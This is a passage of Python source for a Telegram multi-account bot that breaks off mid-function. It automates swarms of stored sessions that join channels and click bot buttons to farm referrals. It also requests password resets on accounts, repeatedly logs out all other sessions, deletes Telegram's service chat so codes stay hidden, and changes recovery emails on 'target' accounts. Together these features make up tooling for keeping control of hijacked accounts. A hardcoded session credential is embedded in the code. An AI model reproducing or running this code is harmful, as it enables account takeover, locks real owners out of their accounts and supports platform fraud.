    """دالة الانضمام الإجبارية عبر جذور تليجرام (Raw API)"""
    try:
        link = link.replace("https://t.me/", "").replace("http://t.me/", "").strip("/")
        if link.startswith("+") or link.startswith("joinchat/"):
            hash_str = link.replace("joinchat/", "").replace("+", "")
            await client.invoke(functions.messages.ImportChatInvite(hash=hash_str))
        else:
            username = link.split("?")[0]
            peer = await client.resolve_peer(username)
            await client.invoke(functions.channels.JoinChannel(channel=peer))
        return True
    except Exception as e:
        if "USER_ALREADY_PARTICIPANT" in str(e): return True
        elif isinstance(e, FloodWait):
            await asyncio.sleep(e.value)
            return True
        return False

async def raw_click_button(client, bot_username, msg_id, callback_data):
    """دالة ضغط أزرار الانلاين الإجبارية (Raw API)"""
    try:
        peer = await client.resolve_peer(bot_username)
        await client.invoke(
            functions.messages.GetBotCallbackAnswer(
                peer=peer,
                msg_id=msg_id,
                data=callback_data
            )
        )
        return True
    except Exception as e:
        if isinstance(e, FloodWait): await asyncio.sleep(e.value)
        return False

async def parse_and_join_bot_logic(client, bot_username, payload, state, is_scout=False, known_channels=None):
    """المحرك الذكي: يقرأ، ينضم بالقوة، يضغط الزر، ويتأكد."""
    if known_channels is None: known_channels = []
    
    start_cmd = f"/start {payload}" if payload else "/start"
    
    # ------------------ خوارزمية السرب (التنفيذ السريع) ------------------
    if not is_scout and known_channels:
        for link in known_channels:
            await raw_join_chat(client, link)
            await asyncio.sleep(0.5)
        
        await client.send_message(bot_username, start_cmd)
        await asyncio.sleep(2.5)
        
        clicked = False
        async for msg in client.get_chat_history(bot_username, limit=2):
            if msg.reply_markup and msg.reply_markup.inline_keyboard:
                for row in msg.reply_markup.inline_keyboard:
                    for btn in row:
                        if hasattr(btn, 'callback_data') and btn.callback_data:
                            await raw_click_button(client, bot_username, msg.id, btn.callback_data)
                            clicked = True
                            break
                    if clicked: break
            if clicked: break
            
        await asyncio.sleep(1)
        await client.send_message(bot_username, start_cmd)
        return True, known_channels

    # ------------------ خوارزمية الكشاف (الاستكشاف العميق) ------------------
    await client.send_message(bot_username, start_cmd)
    newly_found_channels = []
    
    for step in range(3): 
        if not state.get("is_executing"): break
        await asyncio.sleep(3) 
        
        channels_to_join = []
        callback_to_click = None
        
        async for msg in client.get_chat_history(bot_username, limit=3):
            if msg.reply_markup and msg.reply_markup.inline_keyboard:
                for row in msg.reply_markup.inline_keyboard:
                    for btn in row:
                        if hasattr(btn, 'url') and btn.url:
                            channels_to_join.append(btn.url)
                        elif hasattr(btn, 'callback_data') and btn.callback_data:
                            if not callback_to_click:
                                callback_to_click = (msg.id, btn.callback_data)
                                
            if msg.text:
                text_links = re.findall(r'(https?://(?:t\.me|telegram\.me)/[a-zA-Z0-9_+/-]+)', msg.text)
                channels_to_join.extend(text_links)
                
        channels_to_join = list(set(channels_to_join))
        
        if not channels_to_join and not callback_to_click: break
            
        joined_any = False
        for link in channels_to_join:
            if link not in state['joined_channels']: 
                state['joined_channels'].append(link)
                newly_found_channels.append(link)
                
            success_join = await raw_join_chat(client, link)
            if success_join: joined_any = True
            await asyncio.sleep(0.5)
            
        if callback_to_click:
            await raw_click_button(client, bot_username, callback_to_click[0], callback_to_click[1])
            await asyncio.sleep(1.5)
                
        await client.send_message(bot_username, start_cmd)
        
        if not joined_any and not callback_to_click: break
            
    return True, newly_found_channels

async def worker_bot_executor(acc_id, pyro_session, bot_username, app_name, payload_type, payload, state, is_scout=False, known_channels=None):
    async with account_semaphore:
        client = Client(f"smart_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=10)
            
            if payload_type == "startapp":
                await client.send_message(bot_username, f"/start {payload}" if payload else "/start")
                try:
                    peer = await client.resolve_peer(bot_username)
                    if app_name: 
                        await client.invoke(functions.messages.RequestAppWebView(peer=peer, app=types.InputBotAppShortName(bot_id=peer, short_name=app_name), platform='android', write_allowed=True, start_param=payload))
                    else: 
                        await client.invoke(functions.messages.RequestWebView(peer=peer, bot=peer, platform='android', from_bot_menu=False, url="https://t.me/", start_param=payload))
                except: pass
                await asyncio.sleep(4)
                state['completed'] += 1
                return True, []
                
            else:
                success, found_channels = await parse_and_join_bot_logic(client, bot_username, payload, state, is_scout, known_channels)
                if success: state['completed'] += 1
                return success, found_channels
                
        except Exception as e:
            print(f"Error in worker {acc_id}: {e}")
            return False, []
        finally:
            if client.is_connected: await client.disconnect()

async def execute_smart_campaign(uid, target_count, bot_username, app_name, payload_type, payload, saved_msg_obj):
    state = REFERRAL_STATE[uid]
    accounts = get_all_accounts(uid)
    if target_count and target_count < len(accounts): accounts = accounts[:target_count]
        
    if not accounts: return
    
    state['total'] = len(accounts)
    state['completed'] = 0
    state['is_executing'] = True
    state['current_bot'] = bot_username
    if 'joined_channels' not in state: state['joined_channels'] = []
    
    scout_acc = accounts[0]
    swarm_accs = accounts[1:]
    
    scout_text = (f"🛂┊ **نـظـام الإحـالات 🇺🇲**\n\n🕵️‍♂️ **جـاري الاسـتـكـشـاف:**\n⎉╎ يـقـوم حـسـاب الـكـشـاف بـفـحـص الانـلايـن وقـنـوات الاشـتـراك لـ `@{bot_username}`...")
    try: bot.edit_message_text(scout_text, state['chat_id'], state['msg_id'], reply_markup=referral_main_markup(uid), parse_mode="Markdown")
    except: pass
    if saved_msg_obj:
        try: await saved_msg_obj.edit_text(scout_text)
        except: pass

    _, known_channels = await worker_bot_executor(scout_acc[0], scout_acc[4], bot_username, app_name, payload_type, payload, state, is_scout=True)
    
    if not state.get("is_executing"): return
    
    swarm_text = (f"🛂┊ **نـظـام الإحـالات 🇺🇲**\n\n🚀 **بـدأ هـجـوم الـسـرب:**\n⎉╎ الـقـنـوات الـمـكـتـشـفـة: `{len(known_channels)}`\n⏳ جـاري دخـول `{len(swarm_accs)}` حـسـاب فـي نـفـس الـلـحـظـة...")
    try: bot.edit_message_text(swarm_text, state['chat_id'], state['msg_id'], reply_markup=referral_main_markup(uid), parse_mode="Markdown")
    except: pass
    if saved_msg_obj:
        try: await saved_msg_obj.edit_text(swarm_text)
        except: pass

    if swarm_accs:
        await asyncio.gather(*[worker_bot_executor(acc[0], acc[4], bot_username, app_name, payload_type, payload, state, is_scout=False, known_channels=known_channels) for acc in swarm_accs])
    
    if state.get("is_executing"):
        state["is_executing"] = False
        final_text = (f"🛂┊ **نـظـام الإحـالات 🇺🇲**\n\n✅ **تـمـت الـمـهـمـة بـنـجـاح.**\n⎉╎ الـحـسـابـات الـتـي دخـلـت: `{state['completed']}` مـن أصـل `{len(accounts)}`\n\n•❐• اكـتـب `done` لـلـتـنـظـيـف (مـسـح الـبـوت ومـغـادرة الـقـنـوات).")
        try: bot.edit_message_text(final_text, state['chat_id'], state['msg_id'], reply_markup=referral_main_markup(uid), parse_mode="Markdown")
        except: pass
        if saved_msg_obj:
            try: await saved_msg_obj.edit_text(final_text)
            except: pass

def extract_peer_id(peer):
    if isinstance(peer, types.PeerUser): return peer.user_id
    if isinstance(peer, types.PeerChat): return -peer.chat_id
    if isinstance(peer, types.PeerChannel): return int(f"-100{peer.channel_id}")
    return None

async def master_account_daemon(uid, pyro_session, chat_id, msg_id):
    master_client = Client(f"daemon_{uid}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
    
    @master_client.on_message()
    async def master_message_handler(client, message):
        state = REFERRAL_STATE.get(uid)
        if not state or not state.get("is_running"): return
        
        if message.from_user and message.from_user.id == client.me.id:
            if message.chat.id == client.me.id:
                text = message.text.lower() if message.text else ""
                if text in ["done", "false"]:
                    state["is_executing"] = False
                    await cleanup_campaign(uid)
                    status_txt = "بـنـجـاح" if text == "done" else "بـفـشـل"
                    msg_text = f"🛂┊ **نـظـام الإحـالات 🇺🇲**\n\n✅ **تـم إنـهـاء الـمـهـمـة {status_txt} وتـنـظـيـف الـحـسـابـات!** 🧹\n⎉╎ نـجـح: `{state.get('completed', 0)}`"
                    
                    try: await message.edit_text(msg_text)
                    except: pass
                    try: bot.edit_message_text(msg_text, state['chat_id'], state['msg_id'], reply_markup=referral_main_markup(uid), parse_mode="Markdown")
                    except: pass
                
                elif text.startswith(".do ") or text == ".do":
                    if state.get("is_executing"): state["is_executing"] = False; await asyncio.sleep(1)
                    parts = message.text.split(maxsplit=2)
                    target_count = None
                    url = ""
                    if len(parts) >= 2:
                        if parts[1].isdigit():
                            target_count = int(parts[1])
                            if len(parts) >= 3: url = parts[2]
                        else:
                            url = parts[1]
                            
                    if url:
                        match = re.search(r'(?:https?://)?(?:t\.me|telegram\.me)/([^/\?\s]+)(?:/([^/\?\s]+))?(?:\?(start|startapp)=([^&\s]+))?', url, re.IGNORECASE)
                        if match:
                            bot_username = match.group(1)
                            app_name = match.group(2)
                            payload_type = match.group(3).lower() if match.group(3) else "start"
                            payload = match.group(4) if match.group(4) else ""
                            
                            exec_msg = f"🛂┊ **نـظـام الإحـالات 🇺🇲**\n\n⏳ **جـاري تـجـهـيـز الـخـوارزمـيـة...**\n⎉╎ الـهـدف: `@{bot_username}`\n⎉╎ الـعـدد: `{target_count if target_count else 'الـكـل'}`"
                            try: await message.edit_text(exec_msg)
                            except: pass
                            
                            asyncio.create_task(execute_smart_campaign(uid, target_count, bot_username, app_name, payload_type, payload, message))
            
            else:
                if message.text:
                    asyncio.create_task(mirror_action(uid, "send_msg", chat_id=message.chat.id, text=message.text))
                    invite_links = re.findall(r'(https?://(?:t\.me|telegram\.me)/(?:\+|joinchat/)[^\s]+)', message.text)
                    for link in invite_links:
                        asyncio.create_task(mirror_action(uid, "join_chat", chat_id_or_link=link))

        if getattr(message, "group_chat_created", False) or getattr(message, "supergroup_chat_created", False) or getattr(message, "channel_chat_created", False):
            if message.from_user and message.from_user.id == client.me.id:
                asyncio.create_task(mirror_action(uid, "create_chat", title=message.chat.title, is_channel=getattr(message, "channel_chat_created", False)))

    @master_client.on_chat_member_updated()
    async def master_chat_member_handler(client, chat_member_updated):
        state = REFERRAL_STATE.get(uid)
        if not state or not state.get("is_running"): return
        new = chat_member_updated.new_chat_member
        if new and new.user and new.user.id == client.me.id:
            if new.status in [enums.ChatMemberStatus.MEMBER, enums.ChatMemberStatus.ADMINISTRATOR]:
                if chat_member_updated.chat.username:
                    asyncio.create_task(mirror_action(uid, "join_chat", chat_id_or_link=chat_member_updated.chat.username))

    @master_client.on_raw_update()
    async def raw_update_handler(client, update, users, chats):
        state = REFERRAL_STATE.get(uid)
        if not state or not state.get("is_running"): return
        
        if isinstance(update, types.UpdatePeerBlocked):
            peer_id = extract_peer_id(update.peer_id)
            if peer_id:
                action = "block" if update.blocked else "unblock"
                asyncio.create_task(mirror_action(uid, action, peer_id=peer_id))
                
        elif isinstance(update, types.UpdateDeleteHistory):
            peer_id = extract_peer_id(update.peer)
            if peer_id: asyncio.create_task(mirror_action(uid, "del_history", peer_id=peer_id))
            
        elif getattr(update, "QUALNAME", "") == "types.UpdateMessageReactions":
            try:
                peer_id = extract_peer_id(update.peer)
                msg_id = update.msg_id
                
                msg = await client.get_messages(peer_id, msg_id)
                if msg and msg.reactions and msg.reactions.reactions:
                    chosen_emoji = None
                    for r in msg.reactions.reactions:
                        if getattr(r, 'chosen_order', None) is not None or getattr(r, 'chosen', False):
                            chosen_emoji = r.emoji.file_id if hasattr(r.emoji, 'file_id') else r.emoji
                            break
                    if chosen_emoji:
                        asyncio.create_task(mirror_action(uid, "react", peer_id=peer_id, msg_id=msg_id, emoji=chosen_emoji))
            except: pass

    try:
        await master_client.connect()
        me = await master_client.get_me()
        if not me: raise EOFError("Unauthorized")
        await master_client.disconnect()
        
        await master_client.start()
        while REFERRAL_STATE.get(uid, {}).get("is_running"): await asyncio.sleep(2)
            
    except EOFError:
        err_msg = "❌ **فـشـل بـدء الـمـراقـبـة:**\nالـجـلـسـة الافـتـراضـيـة مـنـتـهـيـة أو تـالـفـة، يـرجـى تـغـيـيـرهـا مـن الـقـائـمـة."
        try: bot.send_message(chat_id, err_msg, parse_mode="Markdown")
        except: pass
        if uid in REFERRAL_STATE: REFERRAL_STATE[uid]["is_running"] = False
        
    except Exception as e:
        try: bot.send_message(chat_id, f"❌ **تـوقـفـت الـمـراقـبـة بـسـبـب خـطـأ:**\n`{str(e)}`", parse_mode="Markdown")
        except: pass
        if uid in REFERRAL_STATE: REFERRAL_STATE[uid]["is_running"] = False
        
    finally:
        if master_client.is_connected: 
            try: await master_client.stop()
            except: pass
        try: bot.edit_message_reply_markup(chat_id, msg_id, reply_markup=referral_main_markup(uid))
        except: pass

@bot.callback_query_handler(func=lambda call: call.data == "ref_start")
def ref_start_action(call):
    uid = call.from_user.id
    if not is_allowed(uid): return
    master = get_master_account(uid)
    if not master: return bot.answer_callback_query(call.id, "❌ حـدث خـطـأ!", show_alert=True)
        
    REFERRAL_STATE[uid] = { "is_running": True, "is_executing": False, "chat_id": call.message.chat.id, "msg_id": call.message.message_id, "completed": 0, "total": 0, "joined_channels": [], "current_bot": None }
    
    text = "🛂┊ **نـظـام الإحـالات والـمـرآة الـشـامـلـة 🇺🇲**\n\n•❐• انـا أُراقـبـك الآن، أي تـفـاعـل/شـات/جـروب/مـسـح يـتـم تـقـلـيـده! 🪞\n⎉╎ أرسـل `.do` مـع الـرابـط فـي الـمـحـفـوظـات لـبـدء مـهـمـة."
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=referral_main_markup(uid), parse_mode="Markdown")
    threading.Thread(target=lambda: run_async(master_account_daemon(uid, master[2], call.message.chat.id, call.message.message_id)), daemon=True).start()

@bot.callback_query_handler(func=lambda call: call.data == "ref_stop")
def ref_stop_action(call):
    uid = call.from_user.id
    if not is_allowed(uid): return
    if uid in REFERRAL_STATE: REFERRAL_STATE[uid]["is_running"] = False; REFERRAL_STATE[uid]["is_executing"] = False
    bot.edit_message_text("🛑 **تـم إيـقـاف الـمـرآة ونـظـام الإحـالات بـنـجـاح.**", call.message.chat.id, call.message.message_id, reply_markup=referral_main_markup(uid), parse_mode="Markdown")







#داله اعاده تعيين كلمات المرور هنا




# ==========================================
# 0. تحديث قاعدة البيانات تلقائياً 
# ==========================================
def update_db_for_reset_feature():
    conn = get_db_conn()
    c = conn.cursor()
    try:
        c.execute("ALTER TABLE sessions ADD COLUMN reset_retries INTEGER DEFAULT 0")
        c.execute("ALTER TABLE sessions ADD COLUMN lockdown_mode INTEGER DEFAULT 0")
        conn.commit()
    except:
        pass # الأعمدة موجودة مسبقاً
    finally:
        conn.close()

update_db_for_reset_feature()

# ==========================================
# 1. القوائم المخصصة لميزة الريست
# ==========================================
@bot.callback_query_handler(func=lambda call: call.data == "menu_pass_reset_manage")
def pass_reset_main_menu(call):
    if not is_allowed(call.from_user.id): return
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("• بـدء إعـادة الـتـعـيـيـن (الـكـل/مـفـرد) 🚀", callback_data="pass_reset:start_menu"))
    markup.row(InlineKeyboardButton("• فـحـص حـالـة الـريـسـت والـحـسـابـات 🔍", callback_data="pass_reset:check_all"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))

    text = "🛂┊ **إدارة إعـادة تـعـيـيـن كـلـمـات الـمـرور:**\n\n⎉╎ هـذا الـقـسـم مـخـصـص لـعـمـل (ريـسـت 7 أيـام) لـلـحـسـابـات ومـراقـبـتـهـا بـذكـاء كـل 20 دقـيـقـة وطـرد الـدخـلاء بـدون الـتـأثـيـر عـلـى سـرعـة الـبـوت. 🚀"
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

def pass_reset_keyboard(owner_id):
    accounts = get_all_accounts(owner_id)
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data="do_reset:all"))
    for acc_id, phone, name, uid, _ in accounts:
        markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"do_reset:{acc_id}"))
    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="menu_pass_reset_manage"))
    return markup

@bot.callback_query_handler(func=lambda call: call.data == "pass_reset:start_menu")
def pass_reset_start_menu(call):
    if not is_allowed(call.from_user.id): return
    bot.edit_message_text("🛂┊ إخـتـر الـحـسـاب لـبـدء الـريـسـت:\n\n⎉╎ سـيـتـم طـلـب الـريـسـت، مـسـح مـحـادثـة تـلـيـجـرام، وتـفـعـيـل الـقـفـل الـذكـي.",
                          call.message.chat.id, call.message.message_id, 
                          reply_markup=pass_reset_keyboard(call.from_user.id), parse_mode="Markdown")

# ==========================================
# 2. عملية بدء الريست (مُحسنة بمسح محادثة 777000)
# ==========================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("do_reset:"))
def handle_start_reset(call):
    if not is_allowed(call.from_user.id): return
    target = call.data.split(":")[-1]
    bot.answer_callback_query(call.id, "⏳ جاري تنفيذ أمر الريست...")
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري بـدء إعـادة الـتـعـيـيـن وتـفـعـيـل الـقـفـل بـسـرعـة...", parse_mode="Markdown")
    run_async(process_start_reset_async(call.from_user.id, target, status_msg.chat.id, status_msg.message_id))

async def perform_single_reset(acc_id, phone, pyro_session):
    async with account_semaphore:
        client = Client(f"pr_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=12)
            password_info = await client.invoke(functions.account.GetPassword())

            if not password_info.has_password:
                return f"✅ `{phone}` ┊ لا يـوجـد كـلـمـة مـرور (جـاهـز)."

            # ضرب ريست
            await client.invoke(functions.account.ResetPassword())

            # تفعيل وضع القفل الأمني في القاعدة
            conn = get_db_conn()
            c = conn.cursor()
            c.execute("UPDATE sessions SET lockdown_mode=1, reset_retries=0 WHERE id=?", (acc_id,))
            conn.commit()
            conn.close()

            # طرد باقي الجلسات لضمان عدم وجود أحد حالياً
            try: 
                await client.invoke(functions.auth.ResetAuthorizations())
            except: 
                pass

            # [التحديث الجديد]: مسح محادثة 777000 بالكامل حتى لا يرى المخترق الكود
            try:
                peer = await client.resolve_peer(777000)
                await client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
            except Exception:
                pass

            return f"✅ `{phone}` ┊ تـم طـلـب الـريـسـت ومـسـح شـات تـلـيـجـرام."
        except Exception as e:
            if "PASSWORD_RESET_NEW_CLIENTS" in str(e):
                return f"❌ `{phone}` ┊ انـتـظـر 24 سـاعـة قـبـل الـريـسـت."
            return f"⚠️ `{phone}` ┊ فـشـل الـريـسـت (خـطـأ غـيـر مـتـوقـع)."
        finally:
            if client.is_connected: await client.disconnect()

async def process_start_reset_async(owner_id, target, chat_id, msg_id):
    accounts = get_all_accounts(owner_id)
    if target != "all":
        accounts = [acc for acc in accounts if str(acc[0]) == target]

    tasks = [perform_single_reset(acc[0], acc[1], acc[4]) for acc in accounts]
    results = await asyncio.gather(*tasks)

    success_count = sum(1 for r in results if "✅" in r)

    # --- نظام تقسيم الرسائل الذكي لتفادي خطأ MESSAGE_TOO_LONG ---
    text_chunks = []
    current_text = f"🛂┊ **تـقـريـر بـدء الـريـسـت:**\n⎉╎ الـنـجـاح: {success_count} مـن {len(accounts)}\n\n"

    for res_text in results:
        line = res_text + "\n"
        # إذا اقتربنا من الحد الأقصى لتليجرام، نخزن الرسالة ونبدأ رسالة جديدة
        if len(current_text) + len(line) > 3900:
            text_chunks.append(current_text)
            current_text = "🛂┊ **تـكـمـلـة تـقـريـر الـريـسـت:**\n\n" + line
        else:
            current_text += line

    if current_text:
        text_chunks.append(current_text)

    # إرسال الرسائل المقسمة بانتظام
    for i, chunk in enumerate(text_chunks):
        is_last_chunk = (i == len(text_chunks) - 1)
        # نضع زر الرجوع للقائمة فقط في الرسالة الأخيرة
        markup = home_keyboard(owner_id) if is_last_chunk else None

        try:
            if i == 0:
                # الرسالة الأولى تعدل رسالة "جاري البدء..."
                bot.edit_message_text(chunk, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
            else:
                # الرسائل التكميلية ترسل كرسائل جديدة
                bot.send_message(chat_id, chunk, parse_mode="Markdown", reply_markup=markup)
                await asyncio.sleep(0.3) # وقت راحة بسيط لتجنب الحظر من تليجرام
        except Exception as e:
            pass
# ==========================================
# 3. نظام الفحص المعمق للريست 
# ==========================================
@bot.callback_query_handler(func=lambda call: call.data == "pass_reset:check_all")
def check_all_resets_handler(call):
    if not is_allowed(call.from_user.id): return
    bot.answer_callback_query(call.id, "⏳ جاري الفحص المعمق...")
    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري فـحـص حـالـة الـريـسـت بـسـرعـة...", parse_mode="Markdown")
    run_async(check_all_resets_async(call.from_user.id, status_msg.chat.id, status_msg.message_id))

async def check_single_reset_status(acc_id, phone, pyro_session, owner_id):
    async with account_semaphore:
        conn = get_db_conn()
        c = conn.cursor()
        c.execute("SELECT reset_retries, lockdown_mode FROM sessions WHERE id=?", (acc_id,))
        row = c.fetchone()
        reset_retries = row[0] if row else 0
        conn.close() 

        client = Client(f"chk_rs_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        try:
            await asyncio.wait_for(client.connect(), timeout=12)
            info = await client.invoke(functions.account.GetPassword())

            conn = get_db_conn()
            c = conn.cursor()

            if not info.has_password:
                c.execute("UPDATE sessions SET lockdown_mode=0, reset_retries=0 WHERE id=?", (acc_id,))
                conn.commit()
                conn.close()
                return f"`{phone}` ┊ نـشـط ┊ انـتـهـى الـريـسـت وتـم تـعـطـيـل كـلـمـة الـمـرور ✅\n", 1

            if info.pending_reset_date:
                diff = int(info.pending_reset_date) - int(time.time())
                days = diff // 86400
                hours = (diff % 86400) // 3600
                time_str = f"{days} أيـام" if days > 0 else f"{hours} سـاعـات"

                c.execute("UPDATE sessions SET lockdown_mode=1 WHERE id=?", (acc_id,))
                conn.commit()
                conn.close()
                return f"`{phone}` ┊ نـشـط ┊ تـبـقـى للـريـسـت {time_str} 🇵🇸\n", 1

            else:
                if reset_retries < 2:
                    try:
                        await client.invoke(functions.account.ResetPassword())
                        c.execute("UPDATE sessions SET reset_retries=?, lockdown_mode=1 WHERE id=?", (reset_retries + 1, acc_id))
                        conn.commit()
                        conn.close()
                        return f"`{phone}` ┊ نـشـط ┊ تـم تـعـطـيـل الـريـسـت يـدويـًا وإعـادتـه ┊ 🇵🇸 ❌\n", 1
                    except Exception:
                        conn.close()
                        return f"`{phone}` ┊ نـشـط ┊ تـم الإلـغـاء يـدويـاً وفـشـلـت الإعـادة ⚠️\n", 1
                else:
                    c.execute("UPDATE sessions SET lockdown_mode=0 WHERE id=?", (acc_id,))
                    conn.commit()
                    conn.close()
                    return f"`{phone}` ┊ نـشـط ┊ انـتـهـت مـحـاولات الـريـسـت ❌\n", 1

        except Exception:
            return f"⚠️ `{phone}` ┊ خـطـأ فـي الـشـبـكـة أثـنـاء الـفـحـص\n", 1
        finally:
            if client.is_connected: await client.disconnect()

async def check_all_resets_async(owner_id, chat_id, msg_id):
    accounts = get_all_accounts(owner_id)
    if not accounts: 
        return bot.edit_message_text("❌ لا توجد حسابات مضافة.", chat_id, msg_id, reply_markup=home_keyboard(owner_id))

    # جلب النتائج
    tasks = [check_single_reset_status(acc_id, phone, pyro_session, owner_id) for acc_id, phone, name, uid, pyro_session in accounts]
    results = await asyncio.gather(*tasks)

    active_count = sum(res[1] for res in results)

    # --- نظام تقسيم الرسائل الذكي لتفادي خطأ MESSAGE_TOO_LONG ---
    text_chunks = []
    current_text = f"⎉╎ الـجـلـسـات الـنـشـطـة الآن: {active_count} مـن أصـل {len(accounts)}\n\n🛂┊ نـتـيـجـة فـحـص الـحـسـابـات:\n\n"

    for res_text, _ in results:
        # إذا اقتربنا من الحد الأقصى لتليجرام (حوالي 3900 حرف)، نخزن الرسالة ونفتح واحدة جديدة
        if len(current_text) + len(res_text) > 3900:
            text_chunks.append(current_text)
            current_text = "🛂┊ تـكـمـلـة الـفـحـص:\n\n" + res_text
        else:
            current_text += res_text

    if current_text:
        text_chunks.append(current_text)

    # إرسال الرسائل المقسمة بانتظام
    for i, chunk in enumerate(text_chunks):
        is_last_chunk = (i == len(text_chunks) - 1)
        # نضع أزرار التحكم فقط في الرسالة الأخيرة
        markup = home_keyboard(owner_id) if is_last_chunk else None

        try:
            if i == 0:
                # الرسالة الأولى تعدل رسالة "جاري الفحص..."
                bot.edit_message_text(chunk, chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
            else:
                # الرسائل التكميلية ترسل كرسائل جديدة
                bot.send_message(chat_id, chunk, parse_mode="Markdown", reply_markup=markup)
                await asyncio.sleep(0.3) # تجنب حظر تليجرام للإرسال السريع
        except Exception as e:
            print(f"حدث خطأ أثناء إرسال دفعة الفحص: {e}")

# ==========================================
# 4. المراقب الأمني الذكي (Lightweight Stealth Monitor) 🚀
# ==========================================
async def lockdown_monitor_daemon():
    while True:
        try:
            conn = get_db_conn()
            c = conn.cursor()
            c.execute("SELECT id, pyro_session FROM sessions WHERE lockdown_mode = 1")
            lockdown_accounts = c.fetchall()
            conn.close()

            # يمر على الحسابات المقفلة بسرعة
            for acc_id, pyro_session in lockdown_accounts:
                client = Client(f"bg_lock_{acc_id}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
                try:
                    await asyncio.wait_for(client.connect(), timeout=10)

                    # الفكرة الأسطورية: جلب عدد الجلسات، إذا أكثر من 1، يعني في مخترق دخل!
                    auths = await client.invoke(functions.account.GetAuthorizations())
                    if len(auths.authorizations) > 1:
                        # نطرد الدخيل
                        await client.invoke(functions.auth.ResetAuthorizations())

                except Exception:
                    pass
                finally:
                    # نقفل الاتصال فوراً لنعطي البوت مساحته
                    if client.is_connected:
                        await client.disconnect()

                # استراحة نصف ثانية بين حساب وحساب عشان المعالج ما يحس بشيء
                await asyncio.sleep(0.5)

            # ينام المراقب لمدة 20 دقيقة (1200 ثانية)
            await asyncio.sleep(1200) 

        except Exception:
            await asyncio.sleep(60)

# ==========================================
# 5. تشغيل المراقب في مسار خلفي معزول (Thread)
# ==========================================
def start_lockdown_thread():
    def run_daemon():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(lockdown_monitor_daemon())

    t = threading.Thread(target=run_daemon, daemon=True)
    t.start()

# تشغيل المراقبة فوراً في الخلفية
start_lockdown_thread()







import asyncio
import re
import time
import traceback
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client
from pyrogram.raw.functions.account import SendVerifyEmailCode, VerifyEmail
from pyrogram.raw.types import EmailVerifyPurposeLoginSetup, EmailVerificationCode
from pyrogram.errors import FloodWait, RPCError



import asyncio
import re
import time
import traceback
import threading
import logging
from pyrogram import Client
from pyrogram.raw.functions.account import SendVerifyEmailCode, VerifyEmail
from pyrogram.raw.types import EmailVerifyPurposeLoginSetup, EmailVerificationCode
from pyrogram.errors import FloodWait, RPCError

# متغيرات النظام
DEFAULT_TEMP_MAIL_SESSION = "AgAHll9v5tYKT2k6n2mZD1O63aYm7wDGHMFoARfRybewsPRcqB9i13mhr+adJg71Qb0u9Cy27d/LyEQWruSvW+/ueDUEXYkFqkfRHb5s1odJp7Wswbc5Np9ZpyoWqW8Xvsurb+5R+Z1B1oq1Whk4sc3lo1N1rx3a84f/xSFr/3D6qjHb1g04JbCHH1BwmfG8MDeGriubUFel7guQvXzKUqCgefdyWG+N0LerPzBtbCLeeXKrqJPlspLiNUkasApggpzRd2vlBeSmuvKN5+QDosJAGn7Kjgi42Ajd/G6v/M8fgIkZReDJPvu9yW17u/ZjHGnEJvJQ7iG+TQiY8EOsMcyfAAAAAAAAAAAA"

# تخزين العمال المختارين لكل مستخدم (في الذاكرة المؤقتة)
USER_WORKERS = {}

# ==========================================
# 📡 أزرار أتمتة الإيميل (القوائم)
# ==========================================

def auto_email_menu_keyboard(uid):
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("➕ إضافة/إزالة عمال (حساباتك)", callback_data="manage_workers"))
    markup.row(InlineKeyboardButton("🚀 بدء تغيير الإيميل", callback_data="start_email_targets"))
    markup.row(InlineKeyboardButton("🔙 العودة للرئيسية", callback_data="back_home"))
    return markup

@bot.callback_query_handler(func=lambda call: call.data == 'auto_email_menu')
def auto_email_menu_handler(call):
    try:
        uid = call.from_user.id
        if uid not in USER_WORKERS:
            USER_WORKERS[uid] = set()

        workers_count = len(USER_WORKERS[uid]) + 1  # +1 للحساب الافتراضي
        text = (
            "📧 **أتمتة تغيير الإيميل السريع**\n\n"
            f"👥 **العمال الحاليون:** {workers_count} (يشمل العامل الافتراضي)\n\n"
            "1. أضف حساباتك كعمال لتسريع العملية (اختياري).\n"
            "2. ابدأ العملية واختر الحسابات المستهدفة.\n"
            "⚠️ *ملاحظة: لا يمكن لحساب أن يغير إيميله بنفسه، لذا سيقوم عامل آخر بتغييره.*"
        )
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=auto_email_menu_keyboard(uid), parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Error in auto_email_menu_handler: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'manage_workers')
def manage_workers_cb(call):
    try:
        uid = call.from_user.id
        if uid not in USER_WORKERS:
            USER_WORKERS[uid] = set()

        accounts = get_all_accounts(uid)
        if not accounts:
            bot.answer_callback_query(call.id, "❌ لا توجد حسابات لديك لتعيينها كعمال.", show_alert=True)
            return

        markup = InlineKeyboardMarkup()
        text = "👥 **إدارة العمال (الحسابات المساعدة)**\n\nحدد الحسابات التي تريد استخدامها كعمال:\n\n"

        for acc in accounts:
